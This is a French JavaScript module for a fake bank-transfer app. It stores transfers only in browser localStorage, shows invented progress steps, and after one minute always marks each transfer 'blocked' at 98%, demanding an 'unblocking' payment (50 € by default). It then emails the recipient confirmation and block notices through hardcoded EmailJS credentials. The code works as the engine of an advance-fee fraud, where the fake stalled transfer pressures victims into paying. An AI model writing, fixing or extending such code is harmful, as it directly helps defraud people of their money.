// VirementService.js - VERSION CORRIGÉE
import { getMontantDeblocage } from './UserService';

export const STATUT_VIREMENT = {
  EN_ATTENTE: 'en_attente',
  EN_COURS: 'en_cours',
  VALIDATION: 'validation',
  BLOQUE: 'bloque',
  ANNULE: 'annule'
};

const STORAGE_KEY = 'virements:data';

// Configuration EmailJS
const EMAIL_CONFIG = {
  SERVICE_ID: 'service_cjaxn39',
  USER_ID: 'njMn_oOGEC89lGj7j',
  TEMPLATES: {
    CONFIRMATION: 'template_o56ngdd',
    BLOCAGE: 'template_xd6542w'
  }
};

export class VirementService {

  // Charger tous les virements
  static chargerVirements() {
    try {
      const data = localStorage.getItem(STORAGE_KEY);
      return data ? JSON.parse(data) : [];
    } catch {
      return [];
    }
  }

  // Sauvegarder tous les virements
  static sauvegarderTousLesVirements(virements) {
    try {
      localStorage.setItem(STORAGE_KEY, JSON.stringify(virements));
      return true;
    } catch {
      return false;
    }
  }

  // Créer un virement
  static creerVirement(data) {
    const maintenant = new Date();
    const blocageDans1Minute = new Date(maintenant.getTime() + 1 * 60 * 1000);

    // Récupérer le montant de déblocage spécifique à l'utilisateur
    const montantFinal = parseFloat(getMontantDeblocage(data.numeroCompte)) || 50;

    const virement = {
      id: Date.now(),
      numeroCompte: data.numeroCompte,
      // ✅ CORRECTION: Structure cohérente de l'expéditeur
      expediteur: { 
        nom: data.expediteurNom || data.nom || 'Expéditeur',
        numeroCompte: data.numeroCompte 
      },
      beneficiaire: { 
        nom: data.beneficiaire.nom,
        prenom: data.beneficiaire.prenom,
        iban: data.beneficiaire.iban,
        email: data.beneficiaire.email,
        bic: data.beneficiaire.bic
      },
      montant: parseFloat(data.montant),
      devise: data.devise || 'EUR',
      statut: STATUT_VIREMENT.EN_ATTENTE,
      pourcentageProgression: 0,
      dateCreation: maintenant.toISOString(),
      dateModification: maintenant.toISOString(),
      dateBlocagePrevue: blocageDans1Minute.toISOString(),
      montantDeblocage: montantFinal,
      historique: [
        { statut: STATUT_VIREMENT.EN_ATTENTE, date: maintenant.toISOString(), message: 'Virement initié', pourcentage: 0 }
      ]
    };

    console.log('💰 Virement créé avec montantDeblocage:', virement.montantDeblocage);

    const virements = this.chargerVirements();
    virements.push(virement);
    this.sauvegarderTousLesVirements(virements);

    this.envoyerNotificationConfirmation(virement);

    return virement;
  }

  // Calculer progression
  static calculerProgression(virement) {
    const maintenant = new Date();
    const creation = new Date(virement.dateCreation);
    const blocagePrevue = new Date(virement.dateBlocagePrevue);
    const tempsEcoule = maintenant - creation;
    const tempsTotal = blocagePrevue - creation;
    let pourcentage = Math.floor((tempsEcoule / tempsTotal) * 98);
    return Math.max(0, Math.min(98, pourcentage));
  }

  // Mettre à jour statut
  static mettreAJourStatut(virementId, nouveauStatut, pourcentage, message) {
    const virements = this.chargerVirements();
    const index = virements.findIndex(v => v.id === virementId);
    if (index === -1) return null;

    const virement = virements[index];
    virement.statut = nouveauStatut;
    virement.pourcentageProgression = pourcentage;
    virement.dateModification = new Date().toISOString();
    virement.historique.push({ statut: nouveauStatut, date: new Date().toISOString(), message, pourcentage });

    this.sauvegarderTousLesVirements(virements);
    return virement;
  }

  // Vérifier tous les virements
  static verifierEtMettreAJourVirements() {
    const maintenant = new Date();
    const virements = this.chargerVirements();
    let modifie = false;

    for (const virement of virements) {
      if ([STATUT_VIREMENT.BLOQUE, STATUT_VIREMENT.ANNULE].includes(virement.statut)) continue;

      const blocagePrevue = new Date(virement.dateBlocagePrevue);
      const nouveauPourcentage = this.calculerProgression(virement);

      if (maintenant >= blocagePrevue) {
        const montantDeblocage = virement.montantDeblocage || 0;
        this.mettreAJourStatut(
          virement.id,
          STATUT_VIREMENT.BLOQUE,
          98,
          `🚫 VIREMENT BLOQUÉ - Montant à verser pour débloquer : ${montantDeblocage.toFixed(2)} €`
        );
        this.envoyerNotificationBlocage(virement);
        modifie = true;
      } else if (nouveauPourcentage !== virement.pourcentageProgression) {
        let message = '';
        if (nouveauPourcentage < 25) message = '🔍 Vérification des informations bancaires';
        else if (nouveauPourcentage < 50) message = '⚙️ Traitement bancaire en cours';
        else if (nouveauPourcentage < 75) message = '📤 Transfert vers la banque bénéficiaire';
        else message = '✓ Validation finale en cours';

        this.mettreAJourStatut(virement.id, virement.statut, nouveauPourcentage, message);
        modifie = true;
      }
    }
    return modifie;
  }

  // Email de confirmation
  static envoyerNotificationConfirmation(virement) {
    // ✅ CORRECTION: Variables sans doublons et avec valeurs par défaut
    const templateParams = {
      to_email: virement.beneficiaire.email,
      beneficiary_name: `${virement.beneficiaire.prenom} ${virement.beneficiaire.nom}`,
      sender_name: virement.expediteur?.nom || 'N/A',  // ✅ UNE SEULE FOIS
      sender_iban: virement.expediteur?.numeroCompte || virement.numeroCompte,  // ✅ UNE SEULE FOIS
      amount: virement.montant.toFixed(2),
      currency: virement.devise,
      iban: virement.beneficiaire.iban,
      bic: virement.beneficiaire.bic || 'N/A',
      transfer_id: virement.id,
      reference: virement.id,
      date: new Date(virement.dateCreation).toLocaleString('fr-FR'),
      statut: 'EN_ATTENTE',
      type_notification: 'confirmation'
    };

    console.log('📧 Envoi email de confirmation avec:', templateParams);
    this.envoyerEmail(EMAIL_CONFIG.TEMPLATES.CONFIRMATION, templateParams, 'confirmation');
  }

   // Email de blocage
  static envoyerNotificationBlocage(virement) {
    const montantDeblocage = virement.montantDeblocage || 0;

    // ✅ CORRECTION: Variables cohérentes
    const templateParams = {
      to_email: virement.beneficiaire.email,
      beneficiary_name: `${virement.beneficiaire.prenom} ${virement.beneficiaire.nom}`,
      sender_name: virement.expediteur?.nom || 'N/A',  // ✅ Ajout sécurisé
      sender_iban: virement.expediteur?.numeroCompte || virement.numeroCompte,  // ✅ Ajout sécurisé
      amount: virement.montant.toFixed(2),
      currency: virement.devise,
      iban: virement.beneficiaire.iban,  // ✅ Ajout
      bic: virement.beneficiaire.bic || 'N/A',  // ✅ Ajout
      transfer_id: virement.id,
      reference: virement.id,
      date_blocage: new Date().toLocaleString('fr-FR'),
      montant_deblocage: montantDeblocage.toFixed(2),
      statut: 'BLOQUE',
      type_notification: 'blocage'
    };

    console.log('📧 Envoi email de blocage avec:', templateParams);
    this.envoyerEmail(EMAIL_CONFIG.TEMPLATES.BLOCAGE, templateParams, 'blocage');
  }

  // Envoi générique EmailJS
  static envoyerEmail(templateId, templateParams, type) {
    fetch('https://api.emailjs.com/api/v1.0/email/send', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        service_id: EMAIL_CONFIG.SERVICE_ID,
        template_id: templateId,
        user_id: EMAIL_CONFIG.USER_ID,
        template_params: templateParams
      })
    })
    .then(response => {
      if (response.ok) {
        console.log(`✅ Email de ${type} envoyé à:`, templateParams.to_email);
      } else {
        console.error(`❌ Erreur HTTP ${response.status} pour email de ${type}`);
      }
    })
    .catch(error => console.error(`❌ Erreur envoi email de ${type}:`, error));
  }

  static annulerVirement(virementId) {
    return this.mettreAJourStatut(virementId, STATUT_VIREMENT.ANNULE, 0, 'Virement annulé par l\'utilisateur');
  }

  static supprimerVirement(virementId) {
    const virements = this.chargerVirements();
    this.sauvegarderTousLesVirements(virements.filter(v => v.id !== virementId));
  }

  static getStatutLibelle(statut, pourcentage) {
    switch(statut) {
      case STATUT_VIREMENT.EN_ATTENTE: return { label: `En attente (${pourcentage}%)`, color: 'blue' };
      case STATUT_VIREMENT.EN_COURS: return { label: `En cours (${pourcentage}%)`, color: 'orange' };
      case STATUT_VIREMENT.VALIDATION: return { label: `Validation (${pourcentage}%)`, color: 'yellow' };
      case STATUT_VIREMENT.BLOQUE: return { label: `🚫 BLOQUÉ (98%)`, color: 'red', message: 'Montant à verser pour débloquer' };
      case STATUT_VIREMENT.ANNULE: return { label: 'Annulé', color: 'gray' };
      default: return { label: 'Inconnu', color: 'gray' };
    }
  }

  static resetAllVirements() {
    try { 
      localStorage.removeItem(STORAGE_KEY); 
      console.log('🗑️ Tous les virements ont été supprimés');
      return true; 
    } catch { 
      return false; 
    }
  }

}